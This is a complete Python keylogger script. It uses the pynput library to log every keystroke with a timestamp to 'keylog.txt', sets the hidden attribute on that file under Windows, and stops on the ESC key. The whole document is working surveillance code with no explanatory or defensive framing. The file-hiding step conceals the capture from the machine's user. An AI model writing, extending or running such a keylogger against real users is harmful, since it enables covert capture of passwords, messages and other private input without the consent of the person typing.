from pynput import keyboard
import os
from datetime import datetime

log_file = "keylog.txt"

# Hide the file (Windows only)
def hide_file_windows(file_path):
    import ctypes
    FILE_ATTRIBUTE_HIDDEN = 0x02
    ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)

# Write keystrokes to file
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{datetime.now()} - {key.char}\n")
        except AttributeError:
            f.write(f"{datetime.now()} - [{key}]\n")

# Stop on ESC key
def on_release(key):
    if key == keyboard.Key.esc:
        print("[*] Logging stopped.")
        return False

# Start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("[*] Keylogger started... Press ESC to stop.")
    if os.name == "nt":
        hide_file_windows(log_file)
    listener.join()
